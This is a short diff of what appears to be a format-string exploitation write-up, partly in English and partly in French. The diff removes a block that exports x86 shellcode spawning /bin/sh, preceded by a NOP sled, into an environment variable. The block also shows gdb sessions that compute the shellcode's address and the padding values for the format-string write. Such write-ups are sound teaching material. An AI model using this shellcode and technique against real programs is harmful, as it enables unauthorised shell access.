@@ -29,36 +29,6 @@ Our string is printed at the 10th parameter.
 
 We put our shellcode in an environment variable and find its address:
 
-```bash
-export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
-```
-
-```gdb
-(gdb) x/s *((char **)environ+0)
-0xffffd74a:      "EXPLOIT=\220\220\220"...
-
-
-(gdb)  p/d 0xffffd74a+200
-$1 = 4294957074
-(gdb)  p/d 0xffffd702+200
-$2 = 4294957002
-
-(gdb) p/x 0xffffd74a+200  
-$3 = 0xffffd812
-(gdb) p/x 0xffffd702+200
-$4 = 0xffffd7ca
-
-(gdb) p/d 0xd812  
-$4 = 55314  
-(gdb) p/d 0xd812-8  
-$5 = 55306  
-  
-gdb-peda$ p/d 0xffff  
-$5 = 65535  
-(gdb) p/d 0xffff-55314  
-$6 = 10221  
-```
-  
 Nous pouvons voir que notre string 'aaaa' apparait au printf access parameter numero 10  
   
 ```bash
